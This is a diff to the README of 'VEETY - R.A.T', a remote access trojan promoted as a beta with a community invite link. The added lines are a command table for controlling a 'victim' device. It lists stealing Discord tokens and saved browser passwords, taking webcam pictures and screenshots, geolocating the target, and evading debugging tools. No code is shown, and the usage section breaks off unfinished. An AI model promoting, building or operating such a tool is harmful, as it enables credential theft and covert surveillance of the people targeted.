@@ -7,6 +7,32 @@ Welcome to **VEETY - R.A.T**! 🚀 This repository introduces an innovative and 
 
 <p> !! IT'S BETA - JOIN TO OUR COMMUNITY and BE A EARLY MEMBER! </p>
 
+| **Command**      | **Description**                                      | **Status**         | **Action**          |
+|------------------|------------------------------------------------------|--------------------|---------------------|
+| `ip`            | Retrieve the IP address of the target device.        | ✅ **Working**     | `ip`                |
+| `cam`           | Take a webcam picture.                               | 🟠 **Pending fix** | `cam`               |
+| `ss`            | Take a screenshot of the target device.              | ✅ **Working**     | `ss`                |
+| `winkey`        | Simulate pressing the Windows key.                   | ✅ **Working**     | `winkey`            |
+| `toff`          | Terminate the connection with the target device.     | ✅ **Working**     | `toff`              |
+| `token`         | Retrieve Discord authentication tokens.              | ✅ **Working**     | `token`             |
+| `pgrab`         | Grab saved passwords from multiple browsers.         | ✅ **Working**     | `pgrab`             |
+| `geo`           | Get the geolocation of the target device.            | ✅ **Working**     | `geo`               |
+| `preview_on`    | Start the preview process (delayed).                 | 🔴 **Broken**      | `preview_on`        |
+| `preview_off`   | Stop the preview process (delayed).                  | 🔴 **Broken**      | `preview_off`       |
+| `antidebug-on`  | Make your stub invisible to debugging tools.         | ✅ **Working**     | `antidebug-on`      |
+| `antidebug-off` | Make your stub visible to debugging tools.           | ✅ **Working**     | `antidebug-off`     |
+| `v_reconnect`   | Reconnect the victim client to the server.           | ✅ **Working**     | `v_reconnect`       |
+
+---
+
+### Status Legend:
+- ✅ **Working** - Command is functioning properly.
+- 🟠 **Pending fix** - Command requires some fixes.
+- 🔴 **Broken** - Command is not working at all.
+
+### Usage:
+To copy a command, use the following syntax in the terminal:
+```
 
 [![Join Our Community](https://img.shields.io/badge/Join%20Our%20Community-Click%20Here-1E90FF?style=for-the-badge)](https://dc.gg/veety)
 
